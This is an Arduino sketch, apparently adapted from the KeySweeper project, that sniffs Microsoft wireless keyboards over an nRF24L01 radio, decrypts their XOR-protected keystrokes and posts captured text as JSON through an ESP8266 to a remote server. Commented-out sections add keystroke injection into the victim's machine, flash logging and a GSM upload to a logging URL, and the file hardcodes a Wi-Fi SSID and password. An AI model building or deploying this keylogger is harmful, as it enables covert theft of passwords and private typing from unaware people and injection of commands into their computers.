

#include <SoftwareSerial.h>

#include <Adafruit_ESP8266.h>

#include <nRF24L01.h>
#include <RF24.h>
#include <RF24_config.h>
//#include <SD.h>

//#define SSID "NETGEAR00" //this must be read from the sd-card
//#define PASS "Orione2000%" //this must be read from the sd-card
//#define SSID "esp8266_network" //this must be read from the sd-card
//#define PASS "esp8266_project"
//#define HOST "192.168.1.2" //this must be read from the sd-card
//#define PORT 8000
//#define ESP_RX   3 let's save some memory
//#define ESP_TX   4
//#define URI "/message/new/"

SoftwareSerial esp8266(3, 4);
Adafruit_ESP8266 wifi(&esp8266, &Serial, 5);
/**String user;

String SSID;
String PASS;
String HOST;
**/

 String user = "les";
 String HOST = "192.168.1.2";
  String SSID = "NETGEAR00";
  String PASS = "Orione2000%";
boolean isOffline;

uint8_t sd_pin = 5;
//uint8_t PORT = 8000;



/*

  Channels where seen non-encrypted keyboards on:
  5, 9, 25, 44, 52

  Channels I've seen 2000 (AES) keyboard on:
  3

 unknown packets on unencrypted (could there be channel information here?):
 chan 52 ->
 08: f0f0 f0f0 3daf 6dc9   593d af6d c959 3df0
 08: 0a0a 0a0a c755 9733   a3c7 5597 33a3 c70a


example of encrypted packets from AES keyboard (HID keycode 4 ('a'))
MAC = 0xA8EE9A90CDLL
     8: 08 38 16 01 01 00 F3 2A
     8: 56 56 56 56 56 56 56 56
    20: 09 98 16 01 F8 94 EB F5 45 66 1F DF DE FF E1 12 FC CF 44 91
    20: 0D 98 16 01 8A 22 20 1A 79 29 28 EE 21 E1 78 71 28 B2 C6 B4
    20: 09 98 16 01 1B 10 31 F3 F7 2A E1 F6 77 C5 F2 5E 00 6C B5 A3
     8: 08 38 16 01 C8 B2 00 A2
    20: 09 98 16 01 DF 34 82 79 F4 15 94 68 D6 B0 10 07 25 2F 37 53
    20: 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08
    20: 09 98 16 01 FF 04 2F 16 50 50 BD 9F 8F 96 C8 C4 43 B3 3A 94
     8: 08 38 16 01 CA B2 00 A0
    20: 09 98 16 01 05 79 33 5C 5D 41 FD BA D4 98 FB 5D 48 CA DD 63
    20: 09 98 16 01 5B 8A F9 DF 90 87 15 D2 AA 80 48 6A B2 54 D0 F7

*/

/* pins:
 nRF24L01+ radio:
 1: (square): GND
 2: (next row of 4): 3.3 VCC
 3: CE 9
 4: CSN: 8
 5: SCK: 13
 6: MOSI 11
 7: MISO: 12
 8: IRQ: not used for our purposes

 W25Q80BV flash:
 1: CS: 10
 2: DO: 12
 3: WP: not used
 4: GND: GND
 5: DI: 11
 6: CLK: 13
 7: HOLD: not used
 8: VCC: 3.3 VCC
 */

// log online to this url (only if ENABLE_GSM is defined)
//#define URL "samy.pl/keysweeper/log.php?"

// uncomment #define FLASH if you are using an SPI Flash module to log data
// I'm specifically using the 8mbit W25Q80BV
//#define FLASH

// only enable if you want this to connect to a KeySweeper
// rather than look for the keyboard itself. this is useful
// to download keyboard logs from a KeySweeper device
// BECAUSE I BACKTRACED IT
//#define BACKTRACER 1

// pins on the microcontroller
#define CE 9
#define CSN 8 // normally 10 but SPI flash uses 10
//#define FONA_TX 3
//#define FONA_RST 4
//#define FONA_RX 5 // was 2, but we're going to use that for an interrupt (RI)
//#define LED_PIN 6 // tie to USB led if you want to show keystrokes
//#define PWR_PIN 7 // are we powered via USB

// address to listen for an optional secondary device
// that we can wirelessly send recorded keystrokes back to,
// and it can come and pick up recorded keystrokes from flash
//uint64_t backtraceIt = 0xBADC0DEDLL;

// if you want to also monitor the keystrokes live,
// enable shoutKeystrokes, and you can simply listen to
// channel backtraceIt and KeySweeper will announce
// all keystrokes on this channel
boolean shoutKeystrokes = false;


// ms to turn led OFF when we see a keystroke
//#define LED_TIME 50 // ms
//uint32_t strokeTime = 0;

// Serial baudrate
//#define BAUDRATE 115200

#define sp(a) Serial.print(F(a))
#define spl(a) Serial.println(F(a))
#define pr(a) Serial.print(F(a))
#define prl(a) Serial.println(F(a)) 

#include <SPI.h>
#include "mhid.h"



#include <EEPROM.h>
// location in atmega eeprom to store last flash write address
#define E_FLASH_ADDY 0x00 // 4 bytes
#define E_SETUP      0x04 // 1 byte [could be bit]
#define E_LAST_CHAN  0x05 // 1 byte
#define E_CHANS      0x06 // 1 byte
#define E_FIRST_RUN  0x07 // 1 byte 

//#ifdef FLASH
//#include <Adafruit_TinyFlash.h>

// 256 bytes per page of flash
//#define FLASHPAGE 256

//#define writeFlash() eWrite(E_FLASH_ADDY, flashAddy)
//#define FLASHSETUP 0xBA
//uint8_t buffer[FLASHPAGE];
//uint32_t flashAddy;
//uint32_t flashByte = 0;
//uint32_t isFlash = 0;
//Adafruit_TinyFlash flash;
//#endif


#define csn(a) digitalWrite(CSN, a)
#define ce(a) digitalWrite(CE, a)

#define PKT_SIZE 16
#define MS_PER_SCAN 500

//a9399d5fcd,19,08
//a9399d5fcd,34,08
//a9399d5fcd,05,08
//a9399d5fcd,09,08
// my keyboard channel has been on 0x19, 0x34, 0x05, 0x09, 0x2c
/* me love you */
long time;
uint8_t channel = 50; // [between 3 and 80]
uint16_t lastSeq = 0;

// all MS keyboard macs appear to begin with 0xCD [we store in LSB]
uint64_t kbPipe = 0xAALL; // will change, but we use 0xAA to sniff //A9 35 59 8E CD 20 5 1C
//uint64_t kbPipe = 0xa9399d5fcdLL;

// should we scan for kb or just go based off a known channel/pipe?
// if you turn this off, make sure to set kbPipe to a valid keyboard mac
#define SCAN_FOR_KB 1

// we should calculate this checksum offset by
// calc'ing checksum and xor'ing with actual checksums
uint8_t cksum_idle_offset = 0xFF;
uint8_t cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);

RF24 radio(9, 8);

// FINALLY SOME FUNCTIONS! WOOT!

// decrypt those keyboard packets!
void decrypt(uint8_t* p)
{
  for (int i = 4; i < 15; i++)
    // our encryption key is the 5-byte MAC address (pipe)
    // and starts 4 bytes in (header is unencrypted)
    p[i] ^= kbPipe >> (((i - 4) % 5) * 8) & 0xFF;
}



// calculate microsoft wireless keyboard checksum
void checksum(uint8_t* p, uint8_t ck_i, uint8_t ck_offset)
{
  // calculate our checksum
  p[ck_i] = 0;
  for (int i = 0; i < ck_i; i++)
    p[ck_i] ^= p[i];

  // my keyboard also ^ 0xa0 ... not sure why
  p[ck_i] ^= ck_offset;
}



// if you're looking at this, you found a secret function...
// this INJECTS keystrokes into a machine that uses a MS wireless keyboard ;)
// i will be releasing a project around this soon...
/*void tx(uint8_t* p, uint8_t key)
{
  radio.setAutoAck(true); // only autoack during tx
  radio.openWritingPipe(kbPipe);
  radio.stopListening();

  // get the HID key
  key = hid_reverse(key);

  // increase our sequence by a massive amount (to prevent overlapping)
  p[5] += 128;

  /*
  // increase our sequence
   p[4]++;

   // increment again if we're looking at the first packet
   if (p[9])
   p[4]++;
   */

// place key into payload
/* p[9] = key;
 checksum(p, 15, cksum_key_offset);

 // encrypt our packet (encryption and decryption are the same)
 decrypt(p);

 radio.write(p, 16);

 // now send idle (same seq, idle header, calc cksum, 8 bytes)
 decrypt(p);
 p[6] = 0;
 p[1] = 0x38;
 checksum(p, 7, cksum_idle_offset);

 // encrypt our packet (encryption and decryption are the same)
 decrypt(p);

 for (int j = 0; j < 7; j++)
   radio.write(p, 8);

 // now send keyup (increase seq, change key, calc cksum)
 decrypt(p);
 p[1] = 0x78;
 p[4]++;
 p[6] = 0x43;
 p[7] = 0x00;
 p[9] = 0x00;
 checksum(p, 15, cksum_key_offset);
 // encrypt our packet (encryption and decryption are the same)
 decrypt(p);

 radio.write(p, 16);

 radio.setAutoAck(false); // don't autoack during rx
 radio.openWritingPipe(backtraceIt);
 radio.startListening();
}*/
/**boolean readSD() {

  File settings;
  pinMode(sd_pin, OUTPUT);
  digitalWrite(sd_pin, HIGH);

  if (!SD.begin(sd_pin)) {
    sp("initialization failed!");
    return false;
  }

  settings = SD.open("settings.txt");
  if (settings) {
    sp("settings.txt:");

    // read from the file until there's nothing else in it:
    uint8_t index = 0;
    String line = "";
    while (settings.available()) {
      char readc = settings.read();
      
      if (readc == '\n' || readc == EOF){
        if (index == 0) {
          //user = line.substring(line.indexOf(':')+1);
          user = line;
          index++;
        }
        else if (index == 1) {
          //SSID = line.substring(line.indexOf(':')+1);
          SSID = line;
          index++;
        }
        else if (index == 2) {
          //PASS = line.substring(line.indexOf(':')+1);
          PASS = line;
          index++;
        }
        else if (index == 3) {
          //HOST = line.substring(line.indexOf(':')+1);
          HOST = line;
          index++;
        }
        line = "";
      }
      else
        line += readc;
    }
    

    //this means that the user didn't add a new line to the last line
    if(line != ""){
        HOST = line;

    }
    // close the file:
    settings.close();
  } else {
    // if the file didn't open, print an error:
    sp("error opening settings.txt");
    return false;
  }
  //delete &settings;

  return true;



}**/
char gotKeystroke(uint8_t* p)
{
  char letter;
  uint8_t key = p[11] ? p[11] : p[10] ? p[10] : p[9];
  letter = hid_decode(key, p[7]);

  pr("> ");
  Serial.println(letter);

  // store in our temp array
  //push(letter);


  // store in flash for retrieval later
  //storeKeystroke(letter);

  // send keystroke to remote live monitor (backtracer)
  // and/or send to our remote server
  sendKeystroke(letter);

  return letter;
}

boolean sendKeystroke(char letter)
{
  // if we want to shout to the world the keystrokes live
  String message;
  
  if (letter == '\n' || letter == '\r') {
    
    if (wifi.connectTCP(HOST.c_str(), 8000)) {

      char *json_string = createJson(user.c_str(), message.c_str());
      isOffline = !wifi.httpPost(HOST.c_str(), F("/message/new/"), json_string);
     
      delay(100);

      if (isOffline) {
        //save data to flash
        sp("POST failed");
      }
      free(json_string);
      message = "";

    }
    else
      sp("Connection to HOST failed");
  }
  else
    message += letter;

return true;
}
char* createJson(const char *user, const char *message) {

  char *json = new char[25 + strlen(user) + strlen(message)];
  //strcpy(json, F(""));
  strcpy_P(json,PSTR("{\"message\":\""));
  //strcat(json, F("{\"message\":\""));
  strcat(json, message);
  strcat_P(json, PSTR(",\",\"user\":\""));
  strcat(json, user);
  strcat_P(json,PSTR("\"}"));
  return json;

}

/*void storeKeystroke(char letter)
{
#ifdef FLASH
  buffer[flashByte++] = letter;
  if (flashByte == FLASHPAGE)
  {
    pr("Writing ");
    Serial.println(flashAddy+FLASHPAGE);
    for (int i = 0; i < FLASHPAGE; i++)
    {
      Serial.print((char)buffer[i]);
    }

    flash.writePage(flashAddy, buffer);
    flashAddy += FLASHPAGE;
    writeFlash();

    flashByte = 0;
    for (uint32_t i = 0; i < FLASHPAGE; i++)
      buffer[i] = 0;
  }
#endif
}*/

/* microsoft keyboard packet structure:
 struct mskb_packet
 {
 uint8_t device_type;
 uint8_t packet_type;
 uint8_t model_id;
 uint8_t unknown;
 uint16_t sequence_id;
 uint8_t flag1;
 uint8_t flag2;
 uint8_t d1;
 uint8_t key;
 uint8_t d3;
 uint8_t d4;
 uint8_t d5;
 uint8_t d6;
 uint8_t d7;
 uint8_t checksum;
 };
 */

// check for flash
/*void setupFlash()
{
#ifdef FLASH
  spl("1setupFlash");

  // isFlash will = the capacity
  if (!(isFlash = flash.begin()))
    return;

  // initialize flash address location in eeprom if we don't already have one
  int flashSetup = EEPROM.read(E_SETUP);
  if (flashSetup != FLASHSETUP)
  {
    spl("Flash initializing");
    flashAddy = 0x00;
    writeFlash();

    EEPROM.write(E_SETUP, FLASHSETUP);
  }
  else
    flashAddy = eRead(E_FLASH_ADDY);
  sp("Flash done: ");
  Serial.println(flashAddy);
#endif
}*/

uint8_t flush_rx(void)
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( FLUSH_RX );
  csn(HIGH);

  return status;
}


uint8_t flush_tx(void)
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( FLUSH_TX );
  csn(HIGH);

  return status;
}



/*void ledOn()
{
  // only turn the led on if we have USB power
  if (digitalRead(PWR_PIN))
    digitalWrite(LED_PIN, HIGH);
  else
    digitalWrite(LED_PIN, LOW);
}

void ledOff()
{
  digitalWrite(LED_PIN, LOW);
}
*/
void loop(void)
{
  if (isOffline) {
    isOffline = !wifi.connectToAP(SSID.c_str(), PASS.c_str());
    delay(500);
  }

  uint8_t p[PKT_SIZE], op[PKT_SIZE], lp[PKT_SIZE];
  char ch = '\0';
  uint8_t pipe_num;
  //  spl("loop");

  // if our led is off (flash our led upon keystrokes for fun)
  /* if (strokeTime && millis() - strokeTime >= LED_TIME)
   {
     strokeTime = 0;
     //ledOn();
   }*/

  // if there is data ready
  if ( radio.available(&pipe_num) )
  {
    uint8_t sz = radio.getDynamicPayloadSize();
    radio.read(&p, PKT_SIZE);
    flush_rx();

    // these are packets WE send, ignore por favor
    if (p[0] == 0x52) // 0x52 == 'R'
      return;

    // is this same packet as last time?
    if (p[1] == 0x78)
    {
      boolean same = true;
      for (int j = 0; j < sz; j++)
      {
        if (p[j] != lp[j])
          same = false;
        lp[j] = p[j];
      }
      if (same)
        return;
    }

    // is this our backtrace device asking for keystrokes?
    if (p[0] == 'P' && p[1] == 'W' && p[2] == 'N')
    {
      sp("Got command from backtracer! ");
      Serial.println((char)p[3]);

      // reply to a hello, asking if we're there
      // this is to let a 2nd device quickly discover
      // what channel (frequency) we're on
      /* if (p[4] == 'H')
       {
         pr("got hello! send response\n");
         radio.openWritingPipe(backtraceIt);
         radio.setAutoAck(true); // only autoack during tx
         radio.stopListening();
         char r = 'I';
         radio.write(&r, 1);
         radio.setAutoAck(false); // don't autoack during rx
         radio.startListening();
       }*/
      /*#ifdef FLASH
            // is there space?
            if (isFlash)
            {
              // F = dump flash
              if (p[3] == 'F')
              {
                radio.openWritingPipe(backtraceIt);
                radio.setAutoAck(true); // only autoack during tx
                radio.stopListening();
                flash.beginRead(0);

                for (int j = 0; j < flashAddy; j += PKT_SIZE)
                {
                  // send 16 bytes at a time
                  for (int k = 0; k < PKT_SIZE; k++)
                    op[k] = flash.readNextByte();

                  radio.write(op, PKT_SIZE);

                }
                radio.setAutoAck(false); // don't autoack during rx
                radio.startListening();
              }

              // E = erase flash (which doesn't erase, we just set our pointer back to 0)
              else if (p[4] == 'E')
              {
                flashAddy = 0x00;
                writeFlash();
              }
            }
      #endif*/

      return;
    }

    // decrypt!
    decrypt(p);

    // i think this is retransmit?
    //    if (p[10] != 0x00)
    //      return;

    pr("    ");
    if (sz < 10)
      sp(" ");
    Serial.print(sz);
    pr(": ");
    if (sz > PKT_SIZE) sz = PKT_SIZE;

    for (int i = 0; i < sz / 2; i++)
    {
      if (p[i * 2] < 16)
        sp("0");
      Serial.print(p[i * 2], HEX);
      sp(" ");
      if (p[i * 2 + 1] < 16)
        sp("0");
      Serial.print(p[i * 2 + 1], HEX);
      sp("  ");
    }
    prl("");

    // keypress?
    // we will see multiple of the same packets, so verify sequence is different
    if (p[0] == 0x0a && p[1] == 0x78 && p[9] != 0 && lastSeq != (p[5] << 8) + p[4])
    {
      lastSeq = (p[5] << 8) + p[4];
      ch = gotKeystroke(p);
      for (int j = 0; j < PKT_SIZE; j++) op[j] = p[j];
    }

  }

  //if (ch == 'x')
  //tx(op, 'z');
}


uint8_t n(uint8_t reg, uint8_t value)
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  SPI.transfer(value);
  csn(HIGH);
  return status;

}

uint8_t n(uint8_t reg, const uint8_t* buf, uint8_t len)
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  while (len--)
    SPI.transfer(*buf++);
  csn(HIGH);

  return status;
}


// specifically for sniffing after the scan
// and transmitting to a secondary device
void setupRadio()
{
  spl("2setupRadio");

  radio.stopListening();

  //  radio.openWritingPipe(kbPipe);
  //radio.openWritingPipe(backtraceIt);
  //radio.openReadingPipe(0, backtraceIt);
  radio.openReadingPipe(1, kbPipe);

  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.enableDynamicPayloads();
  radio.setChannel(channel);
  n(0x03, 0x03);

  radio.startListening();
  radio.printDetails();
}


/*
void pipe(uint64_t address)
 {
 n(RX_ADDR_P0, reinterpret_cast<const uint8_t*>(&address), 5);
 }
 */


/*#ifdef FLASH
void eWrite(uint32_t addy, uint32_t buf)
{
  for (uint32_t i = 0; i < sizeof(uint32_t); i++)
    EEPROM.write(addy, (buf >> (8 * i)) & 0xFF);

  pr("Wrote: ");
  Serial.print(buf);
  pr(" ");
  Serial.println(eRead(addy));
}

uint32_t eRead(uint32_t addy)
{
  uint32_t buf = 0;
  for (uint32_t i = sizeof(uint32_t)-1; i >= 0; i--)
  {
    buf += EEPROM.read(addy + i);
    pr("Reading from ");
    Serial.print(addy, HEX);
    pr(" buf ");
    Serial.println(buf);
    buf <<= 8;
  }
  return buf;
}
#endif */


uint8_t read_register(uint8_t reg, uint8_t* buf, uint8_t len)
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( R_REGISTER | ( REGISTER_MASK & reg ) );
  while ( len-- )
    *buf++ = SPI.transfer(0xff);

  csn(HIGH);

  return status;
}

// scans for microsoft keyboards
// we reduce the complexity for scanning by a few methods:
// a) looking at the FCC documentation, these keyboards only communicate between 2403-2480MHz, rather than 2400-2526
// b) we know MS keyboards communicate at 2mbps, so we don't need to scan at 1mbps anymore
// c) we've confirmed that all keyboards have a mac of 0xCD, so we can check for that
// d) since we know the MAC begins with C (1100), the preamble should be 0xAA [10101010], so we don't need to scan for 0x55
// e) we know the data portion will begin with 0x0A38/0x0A78 so if we get that & 0xCD MAC, we have a keyboard!

void scan()
{

  spl("scan");

  uint8_t p[PKT_SIZE];
  uint16_t wait = 10000;

  // FCC doc says freqs 2403-2480MHz, so we reduce 126 frequencies to 78
  // http://fccid.net/number.php?fcc=C3K1455&id=451957#axzz3N5dLDG9C
  channel = EEPROM.read(E_LAST_CHAN);

  // the order of the following is VERY IMPORTANT
  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MIN);
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.setChannel(channel);
  // RF24 doesn't ever fully set this -- only certain bits of it
  n(0x02, 0x00);
  // RF24 doesn't have a native way to change MAC...
  // 0x00 is "invalid" according to the datasheet, but Travis Goodspeed found it works :)
  n(0x03, 0x00);
  radio.openReadingPipe(0, kbPipe);
  radio.disableCRC();
  radio.startListening();
  radio.printDetails();

  // from goodfet.nrf - thanks Travis Goodspeed!
  while (1)
  {
    if (channel > 80)
      channel = 3;

    sp("Tuning to ");
    Serial.println(2400 + channel);
    radio.setChannel(channel++);

    time = millis();
    while (millis() - time < wait)
    {
      if (radio.available())
      {
        radio.read(&p, PKT_SIZE);

        if (p[4] == 0xCD)
        {
          sp("Potential keyboard: ");
          for (int j = 0; j < 8; j++)
          {
            Serial.print(p[j], HEX);
            sp(" ");
          }
          spl("");

          // packet control field (PCF) is 9 bits long, so our packet begins 9 bits in
          // after the 5 byte mac. so remove the MSB (part of PCF) and shift everything 1 bit
          if ((p[6] & 0x7F) << 1 == 0x0A && (p[7] << 1 == 0x38 || p[7] << 1 == 0x78))
          {
            channel--; // we incremented this AFTER we set it
            sp("KEYBOARD FOUND! Locking in on channel ");
            Serial.println(channel);
            EEPROM.write(E_LAST_CHAN, channel);

            kbPipe = 0;
            for (int i = 0; i < 4; i++)
            {
              kbPipe += p[i];
              kbPipe <<= 8;
            }
            kbPipe += p[4];

            // fix our checksum offset now that we have the MAC
            cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);
            return;
          }

          // handle finding Wireless Keyboard 2000 for Business (w/AES)
          // we don't know how to crack yet, but let's at least dump packets
          else if (((p[6] & 0x7F) << 1 == 0x09 && (p[7] << 1 == 0x98)) ||
                   ((p[6] & 0x7F) << 1 == 0x08 && (p[7] << 1 == 0x38)))
          {
            channel--; // we incremented this AFTER we set it
            sp("AES encrypted keyboard found! Locking in on channel ");
            Serial.println(channel);
            //Serial.println("AES encrypted keyboard found! Locking in on channel ");
            EEPROM.write(E_LAST_CHAN, channel);

            kbPipe = 0;
            for (int i = 0; i < 4; i++)
            {
              kbPipe += p[i];
              kbPipe <<= 8;
            }
            kbPipe += p[4];

            // fix our checksum offset now that we have the MAC
            cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);
            return;
          }
        }
      }
    }

    // reset our wait time after the first iteration
    // because we want to wait longer on our first channel
    wait = MS_PER_SCAN;

  }
}

// keep connected to our keysweeper to allow serial input
/*void backtrace(uint8_t channel)
{
  uint8_t p[PKT_SIZE];

  while (1)
  {
    if (radio.available())
    {
      uint8_t got = radio.read(&p, PKT_SIZE);
      sp("Got pkt: ");
      //      for (int i = 0; i < got; i++)
      //        Serial.print((char)p[i]);
      sp(" ");
      for (int i = 0; i < got; i++)
      {
        Serial.print(p[i], HEX);
        sp(" ");
      }
      spl("");
    }

    if (Serial.available() > 0)
    {
      p[0] = 'P';
      p[1] = 'W';
      p[2] = 'N';
      p[3] = Serial.read();
      sp("Sending PWN");
      //  Serial.println((char)p[3]);
      radio.stopListening();
      radio.write(&p, 4);
      radio.startListening();
    }
  }
}*/

// scan for a keysweeper device so we can pull logs off
/*void scanForKeySweeper()
{
  uint8_t p[PKT_SIZE];
  uint16_t wait = MS_PER_SCAN;

  // FCC doc says freqs 2403-2480MHz
  // http://fccid.net/number.php?fcc=C3K1455&id=451957#axzz3N5dLDG9C
  channel = EEPROM.read(E_LAST_CHAN);

  // the order of the following is VERY IMPORTANT
  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MIN);
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  // RF24 doesn't ever fully set this -- only certain bits of it
  n(0x02, 0x00);
  // RF24 doesn't have a native way to change MAC length...
  n(0x03, 0x03);
  radio.setPayloadSize(32);
  radio.enableDynamicPayloads();
  radio.setChannel(channel);
  radio.openReadingPipe(0, backtraceIt);
  radio.openWritingPipe(backtraceIt);
  radio.disableCRC();
  radio.printDetails();

  //  radio.startListening();

  while (1)
  {
    uint8_t buf[8];
    buf[0] = 'P';
    buf[1] = 'W';
    buf[2] = 'N';
    buf[3] = 'H'; // hello packet

    if (channel > 80)
    {
      channel = 3;
      wait *= 2;
    }

    pr("[locating KeySweeper] Tuning to ");
    Serial.println(2400 + channel);
    radio.stopListening();
    radio.setChannel(channel++);
    radio.write(&buf, 4);
    radio.startListening();

    time = millis();
    while (millis() - time < wait)
    {
      if (radio.available())
      {
        radio.read(&p, PKT_SIZE);
        pr("k got ");
        Serial.print(p[0], HEX);
        pr(" ");
        Serial.print(p[1], HEX);
        pr(" ");
        Serial.print(p[2], HEX);
        pr(" ");
        Serial.print(p[3], HEX);
        prl("");

        if (p[0] == 'I')
        {
          // we got the proper response to H - I...HI!
          channel--; // we incremented this AFTER we set it
          pr("Found our KeySweeper!!! Locked onto channel ");
          Serial.println(channel);
          EEPROM.write(E_LAST_CHAN, channel);

          //backtrace(channel);
        }
      }
    }
  }
}*/

/*boolean post_http(char letter)
{
#ifdef ENABLE_GSM
  // Post data to website
  uint16_t statuscode;
  int16_t length;
  char data[80];

  char url[sizeof(URL)+100] = URL;

  // make sure to overwrite null terminator
  memcpy(&url[sizeof(URL)-1], imei, sizeof(imei));

  //  pr(F("Data to post (e.g. \"foo\" or \"{\"simple\":\"json\"}\"):\n"));
  data[0] = 'c';
  data[1] = '=';
  data[2] = letter;
  data[3] = '\0';

  pr("letter is ");
  Serial.println(letter);
  //  strcpy(data, letter);
  //  strcpy(data, "keystrokes");
  pr("Posting to ");
  Serial.println(url);
  Serial.println(data);


  if (!fona.HTTP_POST_start(url, F("text/plain"), (uint8_t *) data, strlen(data), &statuscode, (uint16_t *)&length))
  {
    prl("HTTP POST failed!");
    return false;
  }

  while (length > 0)
  {
    prl("length > 0");
    while (fona.available())
    {
      char c = fona.read();
      pr("c = ");
      Serial.println(c);

      // Serial.write is too slow, we'll write directly to Serial register!
      loop_until_bit_is_set(UCSR0A, UDRE0); // Wait until data register empty.
      UDR0 = c;

      length--;
      if (! length) break;
    }
  }

  fona.HTTP_POST_end();
  return true;

#endif

  //  prl("GSM is not enabled");
  return false;
}*/

void setup()
{
  //pinMode(LED_PIN, OUTPUT);
  //ledOn();

  Serial.begin(115200);

  //setTriggers();
  //setupGsm();
  //setupFlash();


  //readSD();
  esp8266.begin(9600);
  isOffline = !wifi.connectToAP(SSID.c_str(), PASS.c_str());
  delay(500);
  

  spl("Radio setup");
  radio.begin();
  spl("End radio setup");

  // if we're the backtracer device (connect to a keysweeper to download logs)
  //#ifdef BACKTRACER
  //scanForKeySweeper();
  //#endif

  // get channel and pipe
#ifdef SCAN_FOR_KB
  scan();
#endif

  // make sure to resetup radio after the scan
  setupRadio();
}




